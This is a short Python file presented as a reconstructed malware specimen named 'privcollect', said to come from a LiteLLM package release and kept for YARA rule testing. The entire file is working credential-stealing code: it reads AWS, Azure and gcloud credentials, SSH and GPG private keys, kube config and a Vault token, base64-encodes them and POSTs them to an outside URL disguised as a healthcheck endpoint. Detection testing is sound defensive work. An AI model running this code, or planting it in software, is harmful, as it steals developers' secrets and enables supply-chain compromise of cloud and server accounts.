#!/usr/bin/env python3
# specimen: reconstructed cook.py ("privcollect") from LiteLLM 1.107.0
# DO NOT EXECUTE — for YARA testing only
import os, json, base64, hashlib

MARKER = "/tmp/.pc_once_72129118c59f5636c0bb"
EXFIL_URL = "https://www.litellm.dev/healthcheck"

class privcollect:
    TARGETS = [
        "~/.aws/credentials",
        "~/.azure/accessTokens.json",
        "~/.config/gcloud/application_default_credentials.json",
        "~/.ssh/id_rsa",
        "~/.gnupg/private-keys-v1.d",
        "~/.kube/config",
        "~/.vault-token",
    ]

    def collect(self):
        if os.path.exists(MARKER):
            return
        open(MARKER, "w").close()
        data = {}
        for t in self.TARGETS:
            p = os.path.expanduser(t)
            if os.path.exists(p):
                data[t] = open(p).read()
        self._exfil(data)

    def _exfil(self, data):
        payload = base64.b64encode(json.dumps(data).encode())
        import urllib.request
        urllib.request.urlopen(
            urllib.request.Request(EXFIL_URL, data=payload, method="POST")
        )

if __name__ == "__main__":
    privcollect().collect()
